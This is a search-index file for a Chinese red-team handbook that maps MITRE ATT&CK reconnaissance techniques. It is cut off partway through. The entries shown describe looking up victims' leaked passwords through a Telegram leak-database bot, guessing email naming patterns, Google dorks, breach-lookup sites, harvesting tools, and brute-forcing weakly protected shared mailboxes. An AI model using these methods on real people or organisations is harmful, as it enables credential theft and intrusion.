{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Index \u5728 Threathunting-book \u9879\u76ee\u57fa\u7840\u4e0a\u8fdb\u884c\u5b8c\u5584\u7684\u72e9\u730e\u89c6\u89d2\u7ea2\u961fhandbook\uff0c\u611f\u8c22\u539f\u4f5c\u8005\u4eec\u7684\u52aa\u529b\u3002 \u76ee\u5f55 \u4fa6\u5bdf \u8d44\u6e90\u5f00\u53d1 \u521d\u59cb\u8bbf\u95ee \u6267\u884c \u6743\u9650\u7ef4\u6301 \u6743\u9650\u63d0\u5347 \u9003\u907f\u8ffd\u8e2a \u51ed\u8bc1\u83b7\u53d6 \u53d1\u73b0 \u6a2a\u884c\u79fb\u52a8 \u547d\u4ee4\u4e0e\u63a7\u5236 \u6e17\u51fa \u5f71\u54cd \u8fd9\u662f\u6211\u7684\u90ae\u7bb1\ud83d\udcee\uff1a contact@y1ng.org \u6b22\u8fce\u4ea4\u6d41\uff01","title":"Index"},{"location":"#index","text":"\u5728 Threathunting-book \u9879\u76ee\u57fa\u7840\u4e0a\u8fdb\u884c\u5b8c\u5584\u7684\u72e9\u730e\u89c6\u89d2\u7ea2\u961fhandbook\uff0c\u611f\u8c22\u539f\u4f5c\u8005\u4eec\u7684\u52aa\u529b\u3002","title":"Index"},{"location":"#_1","text":"\u4fa6\u5bdf \u8d44\u6e90\u5f00\u53d1 \u521d\u59cb\u8bbf\u95ee \u6267\u884c \u6743\u9650\u7ef4\u6301 \u6743\u9650\u63d0\u5347 \u9003\u907f\u8ffd\u8e2a \u51ed\u8bc1\u83b7\u53d6 \u53d1\u73b0 \u6a2a\u884c\u79fb\u52a8 \u547d\u4ee4\u4e0e\u63a7\u5236 \u6e17\u51fa \u5f71\u54cd \u8fd9\u662f\u6211\u7684\u90ae\u7bb1\ud83d\udcee\uff1a contact@y1ng.org \u6b22\u8fce\u4ea4\u6d41\uff01","title":"\u76ee\u5f55"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%87%AD%E8%AF%81/","text":"T1589-001-\u6536\u96c6\u53d7\u5bb3\u8005\u8eab\u4efd\u4fe1\u606f-\u51ed\u8bc1 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u5728\u5165\u4fb5\u53d7\u5bb3\u8005\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u51ed\u8bc1\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u5728\u76ee\u6807\u5b9a\u4f4d\u671f\u95f4\u4f7f\u7528\u3002\u653b\u51fb\u8005\u6536\u96c6\u7684\u5e10\u6237\u51ed\u636e\u53ef\u4ee5\u662f\u4e0e\u76ee\u6807\u53d7\u5bb3\u8005\u7ec4\u7ec7\u76f4\u63a5\u76f8\u5173\u7684\u51ed\u636e\uff0c\u4e5f\u53ef\u4ee5\u5c1d\u8bd5\u5229\u7528\u7528\u6237\u503e\u5411\u4e8e\u5728\u4e2a\u4eba\u5e10\u6237\u548c\u4f01\u4e1a\u5e10\u6237\u4e2d\u4f7f\u7528\u76f8\u540c\u5bc6\u7801\u7684\u8d8b\u52bf\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5404\u79cd\u65b9\u5f0f\u6536\u96c6\u6b64\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7\u9493\u9c7c\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u5165\u4fb5\u7ad9\u70b9\uff0c\u7136\u540e\u690d\u5165\u65e8\u5728\u6536\u96c6\u8bbf\u95ee\u8005\u7f51\u7ad9\u8ba4\u8bc1cookie\u7684\u6076\u610f\u5185\u5bb9\u3002\u51ed\u8bc1\u4fe1\u606f\u4e5f\u53ef\u80fd\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u5f15\u64ce\uff0c\u6cc4\u9732\u51ed\u636e\u8f6c\u50a8\uff0c\u4ee3\u7801\u4ed3\u5e93\u7b49\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u4ece\u6697\u7f51\u6216\u5176\u4ed6\u9ed1\u5e02\u8d2d\u4e70\u51ed\u8bc1\u3002\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4e3a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u63d0\u4f9b\u53ef\u80fd\u6027\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\u6216\u9493\u9c7c\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5165\u4fb5\u8d26\u53f7\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1\u6216\u6709\u6548\u8d26\u53f7\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b \u4f8b\u5982\uff1a\u5728tg-sgk\u673a\u5668\u4eba\u5904\u76f4\u63a5\u8f93\u5165\u53d7\u5bb3\u8005\u7684\u90ae\u7bb1\u3001\u5fae\u535a\u5730\u5740\u3001\u624b\u673a\u53f7\u7801\u3001QQ\u7b49\u8fdb\u884c\u67e5\u5bfb\u53d7\u5bb3\u8005\u7684\u5bc6\u7801\u4fe1\u606f\u3002 \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1589-001 https://attack.mitre.org/techniques/T1589/001/","title":"T1589-001-\u6536\u96c6\u53d7\u5bb3\u8005\u8eab\u4efd\u4fe1\u606f-\u51ed\u8bc1"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%87%AD%E8%AF%81/#t1589-001-","text":"","title":"T1589-001-\u6536\u96c6\u53d7\u5bb3\u8005\u8eab\u4efd\u4fe1\u606f-\u51ed\u8bc1"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%87%AD%E8%AF%81/#attck","text":"\u5728\u5165\u4fb5\u53d7\u5bb3\u8005\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u51ed\u8bc1\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u5728\u76ee\u6807\u5b9a\u4f4d\u671f\u95f4\u4f7f\u7528\u3002\u653b\u51fb\u8005\u6536\u96c6\u7684\u5e10\u6237\u51ed\u636e\u53ef\u4ee5\u662f\u4e0e\u76ee\u6807\u53d7\u5bb3\u8005\u7ec4\u7ec7\u76f4\u63a5\u76f8\u5173\u7684\u51ed\u636e\uff0c\u4e5f\u53ef\u4ee5\u5c1d\u8bd5\u5229\u7528\u7528\u6237\u503e\u5411\u4e8e\u5728\u4e2a\u4eba\u5e10\u6237\u548c\u4f01\u4e1a\u5e10\u6237\u4e2d\u4f7f\u7528\u76f8\u540c\u5bc6\u7801\u7684\u8d8b\u52bf\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5404\u79cd\u65b9\u5f0f\u6536\u96c6\u6b64\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7\u9493\u9c7c\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u5165\u4fb5\u7ad9\u70b9\uff0c\u7136\u540e\u690d\u5165\u65e8\u5728\u6536\u96c6\u8bbf\u95ee\u8005\u7f51\u7ad9\u8ba4\u8bc1cookie\u7684\u6076\u610f\u5185\u5bb9\u3002\u51ed\u8bc1\u4fe1\u606f\u4e5f\u53ef\u80fd\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u5f15\u64ce\uff0c\u6cc4\u9732\u51ed\u636e\u8f6c\u50a8\uff0c\u4ee3\u7801\u4ed3\u5e93\u7b49\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u4ece\u6697\u7f51\u6216\u5176\u4ed6\u9ed1\u5e02\u8d2d\u4e70\u51ed\u8bc1\u3002\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4e3a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u63d0\u4f9b\u53ef\u80fd\u6027\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\u6216\u9493\u9c7c\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5165\u4fb5\u8d26\u53f7\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1\u6216\u6709\u6548\u8d26\u53f7\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%87%AD%E8%AF%81/#_1","text":"\u4f8b\u5982\uff1a\u5728tg-sgk\u673a\u5668\u4eba\u5904\u76f4\u63a5\u8f93\u5165\u53d7\u5bb3\u8005\u7684\u90ae\u7bb1\u3001\u5fae\u535a\u5730\u5740\u3001\u624b\u673a\u53f7\u7801\u3001QQ\u7b49\u8fdb\u884c\u67e5\u5bfb\u53d7\u5bb3\u8005\u7684\u5bc6\u7801\u4fe1\u606f\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%87%AD%E8%AF%81/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%87%AD%E8%AF%81/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%87%AD%E8%AF%81/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%87%AD%E8%AF%81/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%87%AD%E8%AF%81/#_6","text":"\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002","title":"\u5efa\u8bae"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%87%AD%E8%AF%81/#_7","text":"MITRE-ATT&CK-T1589-001 https://attack.mitre.org/techniques/T1589/001/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/","text":"T1589-002-\u6536\u96c6\u53d7\u5bb3\u8005\u8eab\u4efd\u4fe1\u606f-\u90ae\u7bb1\u5730\u5740 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u5728\u5165\u4fb5\u53d7\u5bb3\u8005\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u90ae\u4ef6\u5730\u5740\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u5728\u76ee\u6807\u5b9a\u4f4d\u671f\u95f4\u4f7f\u7528\u3002\u5373\u4f7f\u5b58\u5728\u5185\u90e8\u5b9e\u4f8b\uff0c\u7ec4\u7ec7\u4e5f\u53ef\u80fd\u5177\u6709\u5916\u90e8\u7684\u7535\u5b50\u90ae\u4ef6\u7cfb\u7edf\u548c\u5458\u5de5\u90ae\u7bb1\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u8f7b\u677e\u5730\u6536\u96c6\u90ae\u4ef6\u5730\u5740\uff0c\u56e0\u4e3a\u5b83\u4eec\u5f88\u5bb9\u6613\u83b7\u5f97\u5e76\u4e14\u53ef\u4ee5\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1a\u793e\u4ea4\u5a92\u4f53\u6216\u641c\u7d22\u53d7\u5bb3\u8005\u62e5\u6709\u7684\u7f51\u7ad9\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4e3a\u5982\u4e0b\u6d3b\u52a8\u63d0\u4f9b\u53ef\u80fd\u6027\uff1a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u6d3b\u52a8\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\u6216\u9493\u9c7c\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u90ae\u4ef6\u8d26\u53f7\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u9493\u9c7c\u653b\u51fb\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b \u6536\u96c6\u90ae\u7bb1\u4fe1\u606f\u4e3b\u8981\u6709\u4e24\u4e2a\u4f5c\u7528\uff1a \u901a\u8fc7\u53d1\u73b0\u76ee\u6807\u7cfb\u7edf\u8d26\u53f7\u7684\u547d\u540d\u89c4\u5f8b\uff0c\u53ef\u4ee5\u7528\u6765\u540e\u671f\u767b\u5165\u5176\u4ed6\u5b50\u7cfb\u7edf\u3002 \u7206\u7834\u767b\u5165\u90ae\u7bb1\u7528\u3002 \u901a\u5e38\u90ae\u7bb1\u7684\u8d26\u53f7\u6709\u5982\u4e0b\u51e0\u79cd\u751f\u6210\u89c4\u5f8b\uff1a \u6bd4\u5982\u67d0\u516c\u53f8\u6709\u5458\u5de5\u540d\u53eb\u505a\u201c\u5f20\u5c0f\u4e09\u201d\uff0c\u5b83\u7684\u90ae\u7bb1\u53ef\u80fd\u5982\u4e0b\uff1a zhangxiaosan@xxx.com xiaosan.zhang@xxx.com zxiaosan@xxx.com \u5f53\u6211\u4eec\u6536\u96c6\u51e0\u4e2a\u90ae\u7bb1\u4e4b\u540e\uff0c\u4fbf\u4f1a\u5927\u81f4\u731c\u51fa\u5bf9\u65b9\u90ae\u7bb1\u7684\u547d\u540d\u89c4\u5f8b\u3002 \u9664\u4e86\u5458\u5de5\u7684\u90ae\u7bb1\u4e4b\u5916\uff0c\u6709\u4e00\u4e9b\u5171\u6709\u7684\u90ae\u7bb1\uff0c\u6bd4\u5982\u4eba\u529b\u7684\u90ae\u7bb1\u3001\u5ba2\u670d\u7684\u90ae\u7bb1\uff0chr@xxx.com\u3001kefu@xxx.com,\u8fd9\u79cd\u90ae\u7bb1\u6709\u65f6\u4f1a\u5b58\u5728\u5f31\u53e3\u4ee4\uff0c\u5728\u6e17\u900f\u65f6\u53ef\u989d\u5916\u7559\u610f\u4e00\u4e0b\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u624b\u5de5\u6216\u8005\u5de5\u5177\u7684\u65b9\u5f0f\u6765\u786e\u5b9a\u641c\u96c6\u90ae\u7bb1\uff1a \u624b\u5de5\u65b9\u5f0f Google Hacking site:target.com intext:@target.com site:target.com \u90ae\u4ef6 site:target.com email github\u7b49\u7b2c\u4e09\u65b9\u6258\u7ba1\u5e73\u53f0 \u5728github\u4e2d\u641c\u7d22\u90ae\u7bb1\u540e\u7f00 \u793e\u5de5\u5e93\u7684\u65b9\u5f0f Online Search Email \u901a\u8fc7\u5168\u7403\u6700\u5927\u7684\u51e0\u4e2a\u6570\u636e\u6cc4\u9732\u7ad9\u70b9\u5728\u7ebf\u67e5\u8be2\u90ae\u7bb1\u4fe1\u606f\u6cc4\u9732\u60c5\u51b5 https://monitor.firefox.com/ https://haveibeenpwned.com/ https://ghostproject.fr/ https://hunter.io/ \u5de5\u5177\u7c7b The Harvester The Harvester\u53ef\u7528\u4e8e\u641c\u7d22Google\u3001Bing\u548cPGP\u670d\u52a1\u5668\u7684\u7535\u5b50\u90ae\u4ef6\u3001\u4e3b\u673a\u4ee5\u53ca\u5b50\u57df\u540d,\u56e0\u6b64\u9700\u8981\u7ffb\u5899\u8fd0\u884c\u8be5\u5de5\u5177\u3002 Infoga Infoga\u53ef\u4ece\u4e0d\u540c\u7684\u516c\u5171\u6e90\u7f51\u7edc\uff08\u641c\u7d22\u5f15\u64ce\uff0cpgp\u5bc6\u94a5\u670d\u52a1\u5668\u548cshodan\uff09\u6536\u96c6\u7535\u5b50\u90ae\u4ef6\u5e10\u6237\u4fe1\u606f\uff08ip\uff0c\u4e3b\u673a\u540d\uff0c\u56fd\u5bb6/\u5730\u533a\uff09\u3002\u662f\u4e00\u4e2a\u7528\u6cd5\u975e\u5e38\u7b80\u5355\u7684\u5de5\u5177\uff0c\u4f46\u662f\uff0c\u5bf9\u4e8e\u6e17\u900f\u6d4b\u8bd5\u7684\u65e9\u671f\u9636\u6bb5\uff0c\u6216\u8005\u53ea\u662f\u4e3a\u4e86\u4e86\u89e3\u81ea\u5df1\u516c\u53f8\u5728\u4e92\u8054\u7f51\u4e0a\u7684\u53ef\u89c1\u6027\u662f\u975e\u5e38\u6709\u6548\u7684\u3002 \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1589-002 https://attack.mitre.org/techniques/T1589/002/ \u90ae\u7bb1\u4fe1\u606f\u6536\u96c6.\u767d\u5e3d\u4e0e\u5b89\u5168 https://www.kancloud.cn/noahs/src_hacker/2119944","title":"T1589-002-\u6536\u96c6\u53d7\u5bb3\u8005\u8eab\u4efd\u4fe1\u606f-\u90ae\u7bb1\u5730\u5740"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/#t1589-002-","text":"","title":"T1589-002-\u6536\u96c6\u53d7\u5bb3\u8005\u8eab\u4efd\u4fe1\u606f-\u90ae\u7bb1\u5730\u5740"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/#attck","text":"\u5728\u5165\u4fb5\u53d7\u5bb3\u8005\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u90ae\u4ef6\u5730\u5740\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u5728\u76ee\u6807\u5b9a\u4f4d\u671f\u95f4\u4f7f\u7528\u3002\u5373\u4f7f\u5b58\u5728\u5185\u90e8\u5b9e\u4f8b\uff0c\u7ec4\u7ec7\u4e5f\u53ef\u80fd\u5177\u6709\u5916\u90e8\u7684\u7535\u5b50\u90ae\u4ef6\u7cfb\u7edf\u548c\u5458\u5de5\u90ae\u7bb1\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u8f7b\u677e\u5730\u6536\u96c6\u90ae\u4ef6\u5730\u5740\uff0c\u56e0\u4e3a\u5b83\u4eec\u5f88\u5bb9\u6613\u83b7\u5f97\u5e76\u4e14\u53ef\u4ee5\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1a\u793e\u4ea4\u5a92\u4f53\u6216\u641c\u7d22\u53d7\u5bb3\u8005\u62e5\u6709\u7684\u7f51\u7ad9\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4e3a\u5982\u4e0b\u6d3b\u52a8\u63d0\u4f9b\u53ef\u80fd\u6027\uff1a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u6d3b\u52a8\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\u6216\u9493\u9c7c\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u90ae\u4ef6\u8d26\u53f7\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u9493\u9c7c\u653b\u51fb\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/#_1","text":"\u6536\u96c6\u90ae\u7bb1\u4fe1\u606f\u4e3b\u8981\u6709\u4e24\u4e2a\u4f5c\u7528\uff1a \u901a\u8fc7\u53d1\u73b0\u76ee\u6807\u7cfb\u7edf\u8d26\u53f7\u7684\u547d\u540d\u89c4\u5f8b\uff0c\u53ef\u4ee5\u7528\u6765\u540e\u671f\u767b\u5165\u5176\u4ed6\u5b50\u7cfb\u7edf\u3002 \u7206\u7834\u767b\u5165\u90ae\u7bb1\u7528\u3002 \u901a\u5e38\u90ae\u7bb1\u7684\u8d26\u53f7\u6709\u5982\u4e0b\u51e0\u79cd\u751f\u6210\u89c4\u5f8b\uff1a \u6bd4\u5982\u67d0\u516c\u53f8\u6709\u5458\u5de5\u540d\u53eb\u505a\u201c\u5f20\u5c0f\u4e09\u201d\uff0c\u5b83\u7684\u90ae\u7bb1\u53ef\u80fd\u5982\u4e0b\uff1a zhangxiaosan@xxx.com xiaosan.zhang@xxx.com zxiaosan@xxx.com \u5f53\u6211\u4eec\u6536\u96c6\u51e0\u4e2a\u90ae\u7bb1\u4e4b\u540e\uff0c\u4fbf\u4f1a\u5927\u81f4\u731c\u51fa\u5bf9\u65b9\u90ae\u7bb1\u7684\u547d\u540d\u89c4\u5f8b\u3002 \u9664\u4e86\u5458\u5de5\u7684\u90ae\u7bb1\u4e4b\u5916\uff0c\u6709\u4e00\u4e9b\u5171\u6709\u7684\u90ae\u7bb1\uff0c\u6bd4\u5982\u4eba\u529b\u7684\u90ae\u7bb1\u3001\u5ba2\u670d\u7684\u90ae\u7bb1\uff0chr@xxx.com\u3001kefu@xxx.com,\u8fd9\u79cd\u90ae\u7bb1\u6709\u65f6\u4f1a\u5b58\u5728\u5f31\u53e3\u4ee4\uff0c\u5728\u6e17\u900f\u65f6\u53ef\u989d\u5916\u7559\u610f\u4e00\u4e0b\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u624b\u5de5\u6216\u8005\u5de5\u5177\u7684\u65b9\u5f0f\u6765\u786e\u5b9a\u641c\u96c6\u90ae\u7bb1\uff1a","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/#_2","text":"","title":"\u624b\u5de5\u65b9\u5f0f"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/#google-hacking","text":"site:target.com intext:@target.com site:target.com \u90ae\u4ef6 site:target.com email","title":"Google 